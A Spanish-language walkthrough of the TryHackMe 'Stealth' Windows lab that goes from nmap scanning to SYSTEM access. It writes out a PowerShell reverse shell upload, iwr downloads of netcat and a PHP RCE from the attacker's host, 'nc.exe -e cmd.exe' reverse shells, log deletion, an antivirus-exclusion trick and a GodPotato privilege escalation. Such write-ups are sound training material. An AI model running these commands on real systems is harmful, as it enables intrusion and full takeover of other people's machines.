## TryHackMe  <> Stealth

![image](https://github.com/Esevka/CTF/assets/139042999/4d6aa794-1d1e-4022-8edb-ffc2fe8cad19)

Enlace Maquina: https://tryhackme.com/room/stealth

Enunciado :
  - Conseguir Flags(user y root)
---

## Escaneo de puertos (NMAP).

-Segun el ttl obtenito (127) despues de lanzar un paquete ICMP a la maquina victima podriamos decir que es una maquina ---> Windows.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/stealth]
    └─# ping -c1 10.10.236.141                            
    PING 10.10.236.141 (10.10.236.141) 56(84) bytes of data.
    64 bytes from 10.10.236.141: icmp_seq=1 ttl=127 time=558 ms
    
    --- 10.10.236.141 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 557.717/557.717/557.717/0.000 ms
    
-Buscamos puertos abiertos en en la maquina victima.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/stealth]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.236.141 -vvv -oG open_ports
    
    PORT      STATE SERVICE       REASON
    139/tcp   open  netbios-ssn   syn-ack ttl 127
    445/tcp   open  microsoft-ds  syn-ack ttl 127
    3389/tcp  open  ms-wbt-server syn-ack ttl 127
    5985/tcp  open  wsman         syn-ack ttl 127
    8000/tcp  open  http-alt      syn-ack ttl 127
    8080/tcp  open  http-proxy    syn-ack ttl 127
    8443/tcp  open  https-alt     syn-ack ttl 127
    47001/tcp open  winrm         syn-ack ttl 127
    49664/tcp open  unknown       syn-ack ttl 127
    49665/tcp open  unknown       syn-ack ttl 127
    49666/tcp open  unknown       syn-ack ttl 127
    49667/tcp open  unknown       syn-ack ttl 127
    49668/tcp open  unknown       syn-ack ttl 127
    49669/tcp open  unknown       syn-ack ttl 127
    49672/tcp open  unknown       syn-ack ttl 127

-Extraemos los puertos de la captura anterior para lanzarles unos scripts basicos de reconocimiento.

Utilizamos un Script en bash simple pero de gran ayuda. Script--> https://github.com/Esevka/CTF/tree/main/Bash

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/stealth]
    └─# list_port open_ports 
    
    [+]Puertos Disponibles --> (Copiados en el Clipboard)
    
    139,445,3389,5985,8000,8080,8443,47001,49664,49665,49666,49667,49668,49669,49672

  -Lanzamos scripts basicos de reconocimiento sobre los puertos abiertos.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/stealth]
    └─# nmap -p 139,445,3389,5985,8000,8080,8443,47001,49664,49665,49666,49667,49668,49669,49672 -sC 10.10.236.141 -vvv -oN info_ports

    PORT      STATE SERVICE       REASON          VERSION
    139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
    
    445/tcp   open  microsoft-ds? syn-ack ttl 127
    
    3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
    |_ssl-date: 2023-12-15T17:47:08+00:00; +1s from scanner time.
    | rdp-ntlm-info: 
    |   Target_Name: HOSTEVASION
    |   NetBIOS_Domain_Name: HOSTEVASION
    |   NetBIOS_Computer_Name: HOSTEVASION
    |   DNS_Domain_Name: HostEvasion
    |   DNS_Computer_Name: HostEvasion
    |   Product_Version: 10.0.17763
    |_  System_Time: 2023-12-15T17:46:28+00:00
    | ssl-cert: Subject: commonName=HostEvasion
    | Issuer: commonName=HostEvasion
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2023-07-28T19:06:15
    | Not valid after:  2024-01-27T19:06:15
    | MD5:   110c:1c21:e230:b7c7:41f5:4b6a:bf2b:9e6a
    | SHA-1: 34ad:3702:1a0a:2054:88a9:ea0c:820b:da64:b1bd:fb56
    | -----BEGIN CERTIFICATE-----
    | MIIC2jCCAcKgAwIBAgIQMIOcafxeh79B5cu+rs/taDANBgkqhkiG9w0BAQsFADAW[...]
    |_-----END CERTIFICATE-----
    
    5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    
    8000/tcp  open  http          syn-ack ttl 127 PHP cli server 5.5 or later
    |_http-title: 404 Not Found
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    
    8080/tcp  open  http          syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
    |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
    |_http-title: PowerShell Script Analyser
    |_http-open-proxy: Proxy might be redirecting requests
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    
    8443/tcp  open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
    | tls-alpn: 
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
    |_http-title: PowerShell Script Analyser
    | ssl-cert: Subject: commonName=localhost
    | Issuer: commonName=localhost
    | Public Key type: rsa
    | Public Key bits: 1024
    | Signature Algorithm: sha1WithRSAEncryption
    | Not valid before: 2009-11-10T23:48:47
    | Not valid after:  2019-11-08T23:48:47
    | MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
    | SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
    | -----BEGIN CERTIFICATE-----
    | MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls[...]
    |_-----END CERTIFICATE-----
    
    47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    
    49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

## Analizamos la informacion obtenida sobre los puertos(Explotacion de la aplicacion obtenemos shell)

Despues de analizar todo, empezaremos por el puerto 8080

--Puerto 8080(http)

  ![image](https://github.com/Esevka/CTF/assets/139042999/9b6a2630-2e5c-4def-92fb-880264e301ef)

  Al encontrarse la aplicacion en dev-mode(puede contener fallos), pensamos en subir una reverse shell en powershell.

  1) Creamos la reverse shell --> rs.ps1

      ![image](https://github.com/Esevka/CTF/assets/139042999/68c212b0-034d-40d8-96dd-248cc3f19942)

  2) Nos ponemos en escucha  y  subimos rs.ps1 a la maquina victima a traves de la aplicacion web.

      ![image](https://github.com/Esevka/CTF/assets/139042999/ffc118d8-fcff-4c0a-b1f6-d4cbf9487450)

          ┌──(root㉿kali)-[/home/…/ctf/try_ctf/stealth/contenido]
          └─# rlwrap nc -lnvp 1988
          listening on [any] 1988 ...
          connect to [10.9.92.151] from (UNKNOWN) [10.10.170.164] 49833
          whoami
          hostevasion\evader

## Post-explotacion(obtenemos flags y elevamos privilegios)

- Subimos a la maquina victima netcat64.exe para obtener una shell mas interactiva y trabajar comodamente.

  Cuando subimos netcat a la maquina victima el sistema nos lo borra, suponemos que tiene windows defender corriendo o algun otro sistema.

- Lo primero que se me ocurre es buscar el directorio donde subimos el script en powershell, al estar en modo-dev posiblemente tenga una excepcion en windows defender.

      pwd
      C:\xampp\htdocs\uploads
      iwr -uri http://10.9.92.151/nc64.exe -o nc.exe
      dir
      hello.ps1 index.php log.txt nc.exe rs.ps1 vulnerable.ps1
      ./nc.exe -e cmd.exe 10.9.92.151 2000

  Obtenemos shell mediante netcat y con ayuda de rlwrap conseguimos mejorar un poco la movilidad en la shell.
    
      ┌──(root㉿kali)-[/home/…/ctf/try_ctf/stealth/contenido]
      └─# rlwrap nc -lnvp 2000  
      listening on [any] 2000 ...
      connect to [10.9.92.151] from (UNKNOWN) [10.10.74.249] 49821
      Microsoft Windows [Version 10.0.17763.1821]
      (c) 2018 Microsoft Corporation. All rights reserved.
      
      C:\xampp\htdocs\uploads>powershell
      powershell
      Windows PowerShell 
      Copyright (C) Microsoft Corporation. All rights reserved.
        
      PS C:\xampp\htdocs\uploads> Get-Acl .\ | Format-List
      Get-Acl .\ | Format-List
      
      Path   : Microsoft.PowerShell.Core\FileSystem::C:\xampp\htdocs\uploads
      Owner  : HOSTEVASION\evader
      Group  : HOSTEVASION\None
      Access : BUILTIN\Users Allow  FullControl
               NT AUTHORITY\SYSTEM Allow  FullControl
               BUILTIN\Administrators Allow  FullControl
               HOSTEVASION\evader Allow  FullControl    ------------> TENEMOS CONTROL TOTAL EN EL DIRECTORIO. <-------------
               CREATOR OWNER Allow  268435456
      Audit  : 
      Sddl   : O:S-1-5-21-1966530601-3185510712-10604624-1022G:S-1-5-21-1966530601-3185510712-10604624-513D:AI(A;OICIID;FA;;;
               BU)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;ID;FA;;;S-1-5-21-1966530601-3185510712-10604624-1022)(A;OICIIOID;GA;
               ;;CO)

- Buscamos la flag de usuario.

      PS C:\users\evader\desktop> dir
      
      Mode                LastWriteTime         Length Name                                                                  
      ----                -------------         ------ ----                                                                  
      -a----        6/21/2016   3:36 PM            527 EC2 Feedback.website                                                  
      -a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website                                   
      -a----         8/3/2023   7:12 PM            194 encodedflag                                                           
      
      PS C:\users\evader\desktop> type encodedflag
      type encodedflag
      -----BEGIN CERTIFICATE-----
      WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDov
      LzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5w
      aHA=
      -----END CERTIFICATE-----

  - Vemos que la flag esta encodeada en base64 la decodeamos y encontramos una url llamativa.
 
        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/stealth/contenido]
        └─# echo 'WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDov
        LzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5w
        aHA=' | base64 -d
        You can get the flag by visiting the link http://<IP_OF_THIS_PC>:8000/asdasdadasdjakjdnsdfsdfs.php

    ![image](https://github.com/Esevka/CTF/assets/139042999/95feb49b-8029-4465-b386-4dcb21ea9a4d)

  - Vamos a borrar los logs como nos indica la pista de la imagen anterior y tras recargar la pagina de nuevo obtenemos la flag de usuario.
 
        PS C:\xampp\htdocs\uploads> rm log.txt
        rm log.txt
    
    ![image](https://github.com/Esevka/CTF/assets/139042999/a021c707-747a-486e-bed8-f1413e74946f)


- Elevamos Privilegios

  -  El acceso a la maquina como usuario "evader" lo hemos obtenido a traves de la aplicacion "Powershell Script Analiser", listamos los permisos de dicho usuario, no tenemos mucho.
  
          PS C:\xampp\htdocs\uploads> whoami /priv
          whoami /priv
          
          PRIVILEGES INFORMATION
          ----------------------
          
          Privilege Name                Description                    State   
          ============================= ============================== ========
          SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
          SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
          PS C:\xampp\htdocs\uploads> 

  - Vamos a obtener acceso a la maquina mediante un rce que subiremos a /uploads y ejecutaremos bajo el servicio de xampp a ver que usuario y privilegios obtenemos.
   
    1) Creamos nuestro rce

         ![image](https://github.com/Esevka/CTF/assets/139042999/5c3c9e23-7ab7-4782-b404-7c3527869fa0)

    2) Levantamos un servicio http para compartir mediante url nuestro rce.

            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/stealth/contenido]
            └─# python3 -m http.server 80
            Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

    3) Subimos rce.php al servidor

            PS C:\xampp\htdocs\uploads> iwr -Uri http://10.9.92.151/rce.php -o rce.php
            iwr -Uri http://10.9.92.151/rce.php -o rce.php

    4) Obtenemos shell 
   
       ![image](https://github.com/Esevka/CTF/assets/139042999/e518bd02-0c1c-4eb2-9dea-700c526cd0f5)

            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/stealth/contenido]
            └─# rlwrap nc -lnvp 2001
            listening on [any] 2001 ...
            connect to [10.9.92.151] from (UNKNOWN) [10.10.74.249] 50005
            Microsoft Windows [Version 10.0.17763.1821]
            (c) 2018 Microsoft Corporation. All rights reserved.
            
            C:\xampp\htdocs\uploads>whoami /priv
            whoami /priv
            
            PRIVILEGES INFORMATION
            ----------------------
            
            Privilege Name                Description                               State   
            ============================= ========================================= ========
            SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
            SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
            SeCreateGlobalPrivilege       Create global objects                     Enabled 
            SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled      


  - Seguimos siendo el usuario "evader" pero en este caso tenemos el privilegio "SeImpersonatePrivilege ---> Enabled"
 
    1) Buscamos informacion de como elevar privilegios localmente, basandonos en los permisos y SO que tenemos disponibles.
     
            C:\xampp\htdocs\uploads>systeminfo
            systeminfo
            
            Host Name:                 HOSTEVASION
            OS Name:                   Microsoft Windows Server 2019 Datacenter
            OS Version:                10.0.17763 N/A Build 17763
            System Type:               x64-based PC
            [...]

          [+]Informacion metodos: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
          
          [+]Metodo que vamos a utilizar: https://github.com/BeichenDream/GodPotato/releases
     
          Nota: Descargamos  GodPotato-NET4.exe

    2) Subimos GodPotato-NET4.exe a la maquina windows como en procesos anteriores.
   
    3) Obtenemos una reverse shell como  NT AUTHORITY\SYSTEM y leemos flag de Administrator.
   
            C:\xampp\htdocs\uploads>GodP.exe
            GodP.exe                                                                                           
                FFFFF                   FFF  FFFFFFF                                                       
               FFFFFFF                  FFF  FFFFFFFF                                                      
              FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF                
              FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
              FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
             FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF   
             FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF  
             FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF  
             FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF 
             FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF 
              FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF 
              FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF  
               FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   
                FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    
            Arguments:
            
                    -cmd Required:True CommandLine (default cmd /c whoami)
            Example:
            GodPotato -cmd "cmd /c whoami"

            C:\xampp\htdocs\uploads>GodP.exe -cmd "nc.exe -e cmd.exe 10.9.92.151 2002"
            GodP.exe -cmd "nc.exe -e cmd.exe 10.9.92.151 2002"
            [*] CombaseModule: 0x140704155631616
            [*] DispatchTable: 0x140704157949104
            [*] UseProtseqFunction: 0x140704157326384
            [*] UseProtseqFunctionParamCount: 6
            [*] HookRPC
            [*] Start PipeServer
            [*] CreateNamedPipe \\.\pipe\4761990a-d5c2-4c5f-95c4-0447b99839dc\pipe\epmapper
            [*] Trigger RPCSS
            [*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
            [*] DCOM obj IPID: 00005c02-1788-ffff-0d5d-c51da84c130d
            [*] DCOM obj OXID: 0x26f608f96ac5b891
            [*] DCOM obj OID: 0x365780b39c893daf
            [*] DCOM obj Flags: 0x281
            [*] DCOM obj PublicRefs: 0x0
            [*] Marshal Object bytes len: 100
            [*] UnMarshal Object
            [*] Pipe Connected!
            [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
            [*] CurrentsImpersonationLevel: Impersonation
            [*] Start Search System Token
            [*] PID : 536 Token:0x608  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
            [*] Find System Token : True
            [*] UnmarshalObject: 0x80070776
            [*] CurrentUser: NT AUTHORITY\SYSTEM
            [*] process start with pid 5112

               
       - Obtenemos Shell como NT AUTHORITY\SYSTEM

              ──(root㉿kali)-[/home/…/ctf/try_ctf/stealth/contenido]
              └─# rlwrap nc -lnvp 2002
              listening on [any] 2002 ...
              connect to [10.9.92.151] from (UNKNOWN) [10.10.74.249] 50141
              Microsoft Windows [Version 10.0.17763.1821]
              (c) 2018 Microsoft Corporation. All rights reserved.
              
              C:\Windows\system32>
         
        - Leemos Administrator Flag 
      
              C:\Users\Administrator\Desktop>type flag.txt
              type flag.txt
              THM{10------ADMIN_ACCESS}


---> Maquina  Stealth completa <---
---
   	











